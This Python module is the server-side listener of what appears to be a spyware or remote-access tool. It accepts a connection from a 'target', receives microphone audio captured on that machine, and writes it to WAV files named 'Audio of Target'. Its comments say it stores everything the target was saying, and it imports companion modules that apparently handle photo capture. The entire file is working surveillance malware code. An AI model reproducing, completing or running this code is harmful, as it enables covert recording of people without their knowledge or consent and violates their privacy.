import sys
import socket
import os
import time
import wave
import ast
import BetterPrinting as bp
from .Server_photos import ServerPhotos
from .Port_data import Ports

class ServerListener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.filename = None

    def check_double(self):
        # This function checks if The Audio file is already in the directory
        dir = os.listdir()
        check = [each_name for each_name in dir if "Audio of Target" in each_name]
        if len(check) == 0:
            # If the directory has no file it will set the filename to default
            self.filename = "Audio of Target.wav"
        else:
            amount = len(check) + 1
            self.filename = f"Audio of Target {amount}.wav"
            # Filename will now be the amount of the audiofiles therer are directory

        return self.filename

    def start(self):
        try:
            listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listening_data.bind((self.ip, self.port))
            listening_data.listen(1000)
            # 5 possible connections
            bp.color("Waiting for connection...", "green")
            # Waits for a connection

            client_socket, ipaddress = listening_data.accept()
            bp.color(f"Connection has been established with {ipaddress}", "green")
            check = 0
            full_msg = ServerPhotos.get_data(self, client_socket, "r", 30000000)
            listening_data.close()
            client_socket.close()
            if full_msg == "THE TARGET HAS NO MICROPHONE ON":
                bp.color("\nTHE TARGET HAS NO MICROPHONE ON\n", "green")
                bp.color('"ServerListener" will be destroyed', "green")
                sys.exit()

            frames = ast.literal_eval(full_msg)
            filename = self.check_double()
            data_file = wave.open(filename, "wb")
            data_file.setnchannels(2)
            data_file.setsampwidth(2)
            data_file.setframerate(44100)
            data_file.writeframes(b''.join(frames))
            data_file.close()
            bp.color(f'"{filename}" has been saved to your directory', "green")

            # This stores everything the target was talking

        except OSError:
            working_port = Ports.get_working_ports()
            if str(self.port) in working_port:
                bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERLISTENER. PORT NUMBER: {self.port} already in use","green")
                time.sleep(1)
                os._exit(0)
